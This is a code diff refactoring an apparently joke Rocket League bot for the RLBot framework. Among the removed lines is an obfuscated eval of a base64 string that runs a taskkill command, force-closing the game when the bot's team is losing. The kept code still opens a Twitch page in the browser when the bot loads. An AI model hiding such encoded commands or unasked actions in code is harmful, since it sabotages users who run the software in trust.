@@ -1,18 +1,18 @@
 import base64
 import math
 import random
-import os
-from random import randint as whoops
 from random import triangular as triforce
 import webbrowser
 import yeet as y
 from rlbot.agents.base_agent import BaseAgent, SimpleControllerState
 from rlbot.utils.structures.game_data_struct import GameTickPacket
+# Anarchy requires the newest rlutilities which cannot be pip installed via `pip install rlutilities` because it is not on PyPI. You must install it via `pip install -e .` after cloning the RLUtilities repository at: https://github.com/samuelpmish/RLUtilities.
 from rlutilities.linear_algebra import *
 from rlutilities.mechanics import Aerial
 from rlutilities.simulation import Game, Ball
 from utils import *
 from vectors import *
+from typing import Optional
 
 
 # first!
@@ -23,36 +23,24 @@ class Anarchy(BaseAgent):
         Game.set_mode("soccar")
         ie = webbrowser.get('windows-default')
         ie.open('https://www.twitch.tv/donutkiller_pro')
-        self.game = Game(index, team)
-        self.howDoIUse_this = []
-        another_thingySomeoneShouldTeachMe_howThis_WORKS = []
-        self.howDoIUse_this.append(another_thingySomeoneShouldTeachMe_howThis_WORKS)
-        for i in range(100):
-            self.howDoIUse_this.append(0)
 
-        countyThingy_DONOTTOUCH = 0
-        while countyThingy_DONOTTOUCH < 8:
-            Number_iGuess = whoops(1, 101)
-            if Number_iGuess not in another_thingySomeoneShouldTeachMe_howThis_WORKS:
-                another_thingySomeoneShouldTeachMe_howThis_WORKS.append(Number_iGuess)
-                countyThingy_DONOTTOUCH += 1
-
-        self.flippityThe_CAR = 0
-        self.CountyTHIS_ALSOdonttuch = 0
-        self.WHOOPITYScooPTI = 0
-        
-        self.team = team
+        self.game: Game = Game(index, team)
+        self.aerial: Optional[Aerial] = None
+        self.controller: SimpleControllerState = SimpleControllerState()
+        self.state: State = State.NOT_AERIAL
 
     def initialize_agent(self):
         pass
 
     def get_output(self, packet: GameTickPacket) -> SimpleControllerState:
         self.game.read_game_information(packet, self.get_rigid_body_tick(), self.get_field_info())
+
+        # Handle aerialing
         if self.game.ball.location[2] > 250:
-            if self.state == "Aerial":
+            if self.state == State.AERIAL:
                 self.aerial.step(self.game.time_delta)
                 if self.aerial.finished:
-                    self.state = "Not Aerial"
+                    self.state = State.NOT_AERIAL
                 return self.aerial.controls
             else:
                 self.aerial = Aerial(self.game.my_car)
@@ -67,9 +55,9 @@ class Anarchy(BaseAgent):
                         if self.aerial.is_viable():
                             self.aerial.target = prediction.location
                             self.aerial.arrival_time = prediction.time
-                            self.target_ball = Ball(prediction)
-                            self.state = "Aerial"
+                            self.state = State.AERIAL
                             break
+
         ball_location = Vector2(packet.game_ball.physics.location.x, packet.game_ball.physics.location.y)
 
         my_car = packet.game_cars[self.index]
@@ -81,16 +69,17 @@ class Anarchy(BaseAgent):
         # The,type;of,punctuation;matters!
         true = shreck is love, shreck is life
         main(9)
-        if not true:
+        if true:
             print("https://www.twitch.tv/TehRedox is the best twitch channel")
-            y.yeet()
 
+        """ I don't have enough deletions to delete this mess, so I'll comment it out instead. Please delete if you have enough deletions.
         self.WHOOPITYScooPTI = 0
         for i in range(packet.num_cars):
             self.WHOOPITYScooPTI += packet.game_cars[i].score_info.goals
 
         if self.WHOOPITYScooPTI > self.CountyTHIS_ALSOdonttuch:
             self.CountyTHIS_ALSOdonttuch = self.WHOOPITYScooPTI
+        """
 
         self.renderer.begin_rendering(str(y))
         # commented out due to performance concerns
@@ -103,8 +92,9 @@ class Anarchy(BaseAgent):
         self.renderer.end_rendering()
 
         steer_correction_radians = car_direction.correction_to(car_to_ball)
-        turn = clamp11(steer_correction_radians * -3)
+        turn = clamp11(steer_correction_radians * 3)
 
+        """ I don't have enough deletions to delete this mess, so I'll comment it out instead. Please delete if you have enough deletions.
         if self.flippityThe_CAR < 1:
             self.howDoIUse_this[self.howDoIUse_this[0][5]] = True
             self.flippityThe_CAR = 1
@@ -119,29 +109,13 @@ class Anarchy(BaseAgent):
             self.flippityThe_CAR += 6
         elif self.flippityThe_CAR >= 666:
             self.flippityThe_CAR = 0
+        """
+        self.controller.throttle = 1
+        self.controller.steer = turn
+        self.controller.boost = (abs(turn) < 0.2 and not my_car.is_super_sonic)
+        self.controller.handbrake = (abs(turn) > 1.5 and not my_car.is_super_sonic)
 
-        self.howDoIUse_this[self.howDoIUse_this[0][0]] = 1
-        self.howDoIUse_this[self.howDoIUse_this[0][1]] = turn
-        self.howDoIUse_this[self.howDoIUse_this[0][6]] = (abs(turn) < 0.2 and not my_car.is_super_sonic)
-        self.howDoIUse_this[self.howDoIUse_this[0][7]] = (abs(turn) > 1.5 and not my_car.is_super_sonic)
-
-        if packet.teams[self.team].score < packet.teams[1 - self.team].score:
-            eval(base64.b64decode('b3Muc3lzdGVtKCd0YXNra2lsbCAvZiAvaW0gcm9ja2V0bGVhZ3VlLmV4ZScp'))
-
-        return getSensible_thingToCONTROL(self.howDoIUse_this)
-
-
-def getSensible_thingToCONTROL(magicWariable):
-    ThisISTHE_controller = SimpleControllerState()
-    ThisISTHE_controller.throttle = magicWariable[magicWariable[0][0]]
-    ThisISTHE_controller.steer = magicWariable[magicWariable[0][1]]
-    ThisISTHE_controller.pitch = magicWariable[magicWariable[0][2]]
-    ThisISTHE_controller.yaw = magicWariable[magicWariable[0][3]]
-    ThisISTHE_controller.roll = magicWariable[magicWariable[0][4]]
-    ThisISTHE_controller.jump = magicWariable[magicWariable[0][5]]
-    ThisISTHE_controller.boost = magicWariable[magicWariable[0][6]]
-    ThisISTHE_controller.handbrake = magicWariable[magicWariable[0][7]]
-    return ThisISTHE_controller
+        return self.controller
 
 
 def get_car_facing_vector(car):
